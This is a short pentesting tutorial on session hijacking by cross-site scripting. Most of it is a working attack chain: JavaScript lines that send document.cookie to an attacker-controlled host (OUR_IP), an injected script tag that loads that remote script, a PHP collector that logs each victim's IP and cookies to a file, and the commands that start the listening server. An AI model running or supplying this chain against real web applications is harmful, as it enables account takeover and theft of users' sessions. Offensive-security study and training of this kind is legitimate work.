# Session hijacking

:::note
Session hijacking is also called __Cookie Stealing__.
:::

## Overview

Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. If a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.

Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS eploitation and perform a _session hijacking_ attack.

## Attack example

Create a `script.js` with either of the following examples:

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Then use XSS to inject the remote script into the vulnerable input field:

```html
<script src=http://OUR_IP/script.js></script>
```

We can write a PHP script to split cookies with a new line and write them to a file. In this case, even if multiple victims trigget the XSS exploit, we'll get all of their cookies ordered in a file:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Start the PHP server:

```console
$ mkdir /tmp/tmpserver
$ cd /tmp/tmpserver
$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

And then just wait for the victim to trigger the XSS exploit. When this happens, we'd see a call in our server. We can check the `cookies.txt` file to see if we got the cookie.
